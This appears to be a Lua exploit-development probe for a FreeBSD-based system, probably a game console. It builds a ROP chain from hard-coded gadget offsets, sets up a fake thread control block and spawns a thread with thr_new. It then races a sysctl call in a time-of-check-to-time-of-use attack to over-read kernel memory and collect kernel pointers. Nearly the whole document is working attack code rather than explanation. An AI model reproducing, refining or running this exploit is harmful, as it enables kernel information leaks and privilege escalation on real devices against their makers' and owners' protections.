-- CRASH_CLASS: MODERATE
-- PROBE 393d: sysctl TOCTOU race v3 — ZERO wq calls, ALL write_dword
--
-- 393b and 393c both crashed from stdout corruption caused by
-- memory.write_qword with uint64 values. This version uses ONLY
-- memory.write_dword for ALL memory operations including chain build.
-- The only uint64 usage is in syscall arguments (which don't corrupt).

print("=== PROBE 393d: sysctl TOCTOU v3 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

-- Write 64-bit value as two dwords. NO wq anywhere.
local function w64(addr, lo, hi)
    wd(addr, lo or 0)
    wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end
local function fill_sent(buf, len)
    for i = 0, len - 4, 4 do wd(N(buf) + i, 0xDEADDEAD) end
end

-- Ignore SIGSYS — use w64 instead of wq
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
w64(N(act), 1, 0)  -- handler = SIG_IGN = 1
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)

-- Get eboot base
local info_buf = memory.alloc(0x200)
zero_buf(info_buf, 0x200)
wd(N(info_buf), 0x160)
pcall(function() mk(593)(uint64(0), info_buf) end)
local eb_lo = rd(N(info_buf) + 0x108) or 0
local eb_hi = rd(N(info_buf) + 0x10C) or 0
print(string.format("eboot=%X_%08X", eb_hi, eb_lo))

-- fn_addr
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_val = tonumber(fn_str)
local fn_lo = fn_val % 0x100000000
local fn_hi = math.floor(fn_val / 0x100000000)
print(string.format("fn_addr=%X_%08X", fn_hi, fn_lo))

-- Gadget offsets
local G = {
    pop_rax = 0x992,
    pop_rdi = 0xC9DFE,
    pop_rsi = 0xD77D,
    pop_rdx = 0x3B02D7,
    pop_rcx = 0xE64,
    bare_ret = 0x42,
    mov_rdi_rax = 0x92C67,
}

-- Add eboot base to gadget offset, return lo, hi
local function gadget_addr(offset)
    local lo = eb_lo + offset
    local hi = eb_hi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- Shared race memory
local shared = memory.alloc(0x100)
zero_buf(shared, 0x100)
local oldlenp_addr = N(shared)
local flag_addr = N(shared) + 0x10

local small_len = 0x448
local large_len = 0x2000

wd(flag_addr, 1)
wd(oldlenp_addr, small_len)

-- Stack for child
local STACK_SIZE = 0x10000
local stack = memory.alloc(STACK_SIZE)
zero_buf(stack, STACK_SIZE)
local stack_base = N(stack)
local entry_rsp = ((stack_base + STACK_SIZE) - ((stack_base + STACK_SIZE) % 16)) - 8

-- Fake TCB — self-referencing pointer
local fake_tcb = memory.alloc(0x1000)
zero_buf(fake_tcb, 0x1000)
local tcb_addr = N(fake_tcb)
w64(tcb_addr, tcb_addr % 0x100000000, math.floor(tcb_addr / 0x100000000))

-- Pointer-to-TCB buffer
local tcb_ptr_buf = memory.alloc(8)
w64(N(tcb_ptr_buf), tcb_addr % 0x100000000, math.floor(tcb_addr / 0x100000000))

-- Build ROP chain — ALL via w64
local sp = entry_rsp

local function push_g(offset)
    local lo, hi = gadget_addr(offset)
    w64(sp, lo, hi)
    sp = sp + 8
end
local function push_v(lo, hi)
    w64(sp, lo or 0, hi or 0)
    sp = sp + 8
end
local function push_fn()
    w64(sp, fn_lo, fn_hi)
    sp = sp + 8
end

-- Step 1: sysarch(165, SET_FSBASE=129, &tcb_ptr_buf)
-- start_func = pop_rax, so first on stack = value for RAX
push_v(165)           -- RAX = 165 (sysarch)
push_g(G.pop_rdi)
push_v(129)           -- RDI = SET_FSBASE
push_g(G.pop_rsi)
push_v(N(tcb_ptr_buf) % 0x100000000, math.floor(N(tcb_ptr_buf) / 0x100000000))
push_g(G.pop_rdx)
push_v(0)
push_g(G.pop_rcx)
push_v(0)
push_fn()

-- Step 2: Flip loop — 100 iterations
local FLIP = 100
for i = 1, FLIP do
    push_g(G.pop_rdi)
    push_v(oldlenp_addr)
    push_g(G.pop_rax)
    push_v(large_len)
    push_g(G.mov_rdi_rax)

    push_g(G.pop_rdi)
    push_v(oldlenp_addr)
    push_g(G.pop_rax)
    push_v(small_len)
    push_g(G.mov_rdi_rax)
end

-- Signal done
push_g(G.pop_rdi)
push_v(flag_addr)
push_g(G.pop_rax)
push_v(0)
push_g(G.mov_rdi_rax)

-- thr_exit(431)
push_g(G.pop_rax)
push_v(431)
push_g(G.pop_rdi)
push_v(0)
push_fn()

local chain_bytes = sp - entry_rsp
print(string.format("chain=%d bytes", chain_bytes))

if chain_bytes > STACK_SIZE - 0x200 then
    print("chain too large!")
    return
end

-- thr_param — ALL w64
local param = memory.alloc(0x38)
zero_buf(param, 0x38)
local pr_lo, pr_hi = gadget_addr(G.pop_rax)
w64(N(param), pr_lo, pr_hi)       -- start_func = pop_rax_ret
w64(N(param) + 8, 0, 0)            -- arg
w64(N(param) + 0x10, stack_base, 0) -- stack_base
w64(N(param) + 0x18, STACK_SIZE, 0) -- stack_size
local child_tid = memory.alloc(8)
zero_buf(child_tid, 8)
w64(N(param) + 0x30, N(child_tid) % 0x100000000,
    math.floor(N(child_tid) / 0x100000000))

if not alive() then print("DEAD setup"); return end

-- ===================================================================
-- [A] Launch child flipper
-- ===================================================================
print("[A] launch child")

local ok_thr, rv_thr = pcall(function()
    return mk(455)(uint64(N(param)), uint64(0x38))
end)
local thr_ret = ok_thr and N(rv_thr) or -999
print(string.format("thr_new=%d", thr_ret))

if thr_ret ~= 0 then
    print("thr_new failed")
    return
end
if not alive() then print("DEAD thr"); return end

-- ===================================================================
-- [B] Race sysctl
-- ===================================================================
print("[B] racing")

local mib = memory.alloc(16)
wd(N(mib), 1)
wd(N(mib) + 4, 14)
wd(N(mib) + 8, 1)
wd(N(mib) + 12, pid_val)

local outbuf = memory.alloc(0x2000)
local sc = mk(202)

local ROUNDS = 500
local kptr_n = 0
local over_n = 0
local err_n = 0

for r = 1, ROUNDS do
    if not alive() then break end

    fill_sent(outbuf, 0x2000)
    wd(oldlenp_addr, small_len)
    wd(oldlenp_addr + 4, 0)

    local ok_s, rv_s = pcall(function()
        return sc(uint64(N(mib)), uint64(4), outbuf,
            uint64(oldlenp_addr), uint64(0), uint64(0))
    end)
    local ret = ok_s and N(rv_s) or -999

    if ret == 0 then
        -- Check past kinfo_proc for data
        local past = false
        for off = 0x448, 0x478, 4 do
            local d = rd(N(outbuf) + off)
            if d ~= nil and d ~= 0xDEADDEAD then
                past = true
                break
            end
        end

        if past then
            over_n = over_n + 1
            -- Scan for kernel pointers
            for off = 0x448, 0x1FF0, 8 do
                local lo = rd(N(outbuf) + off)
                local hi = rd(N(outbuf) + off + 4)
                if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    kptr_n = kptr_n + 1
                    if kptr_n <= 10 then
                        print(string.format("KPTR r%d +%03X: %08X_%08X",
                            r, off, hi, lo or 0))
                    end
                end
            end
            if over_n <= 3 then
                print(string.format("OVER r%d", r))
            end
        end
    elseif ret == -999 then
        err_n = err_n + 1
    end
end

local child_done = rd(flag_addr) == 0
print(string.format("R=%d over=%d kptr=%d err=%d child=%s",
    ROUNDS, over_n, kptr_n, err_n,
    child_done and "done" or "run"))

if not alive() then print("DEAD"); return end
print("canary=OK")
print("=== 393d COMPLETE ===")
